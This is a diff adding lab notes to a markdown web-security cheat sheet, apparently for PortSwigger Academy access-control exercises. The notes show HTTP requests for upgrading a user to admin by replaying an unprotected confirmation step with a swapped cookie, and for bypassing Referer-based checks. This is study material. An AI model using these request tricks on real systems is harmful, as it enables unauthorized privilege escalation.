@@ -871,8 +871,17 @@
 - **Insecure direct object references**
   - view other chat history   
     GET /download-transcript/`1.txt`
-- Multi-step process with no access control on one step   
-- Referer-based access control   
+- **Multi-step process** with no access control on one step
+  - 1st step: POST /admin-roles
+    username=carlos&action=upgrade > access denied
+  - 2nd step Confirmation: POST /admin-roles
+    action=upgrade&**confirmed=true**&**username=wiener**
+    **Replace cookies with attacker's one** and reply it > OK   
+- **Referer**-based access control   
+  GET /admin-roles?**username=wiener**&action=upgrade
+  Referer: https://0a6700d3044a5e898157ed94008d007c.web-security-academy.net/admin
+  Login as wiener user, obtain the cookie, replace in the original admin's request
+  Missing referer > get unauthorized error > paste back the referrer > OK
 
 ## File Upload
 Content for File Upload...
